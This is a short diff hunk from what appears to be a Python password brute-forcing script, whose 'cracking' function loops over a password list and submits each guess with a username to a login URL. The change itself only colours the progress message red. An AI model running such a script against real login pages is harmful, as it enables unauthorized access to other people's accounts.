@@ -10,7 +10,7 @@ cookie_value = input('[+] Enter Cookie Value: ')
 def cracking(username, url):
 	for password in passwords:
 		password = password.strip()
-		print(f'trying this password: {password}')
+		print(colored(('trying this password: ' + password), 'red'))
 		data = {
 			'username': username,
 			'password': password,
